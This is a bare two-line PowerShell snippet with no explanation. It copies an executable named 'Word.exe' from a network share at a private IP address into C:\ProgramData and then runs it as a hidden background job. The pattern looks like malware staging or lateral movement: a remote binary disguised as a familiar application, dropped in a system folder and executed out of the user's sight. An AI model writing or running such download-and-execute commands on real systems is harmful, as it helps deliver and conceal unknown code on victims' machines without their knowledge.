Copy-Item -Path "\\10.11.3.193\Share\Word.exe" -Destination "C:\Programdata\Word.exe"
Start-Job -ScriptBlock { Start-Process -FilePath "C:\Programdata\Word.exe" -Wait -WindowStyle Hidden }
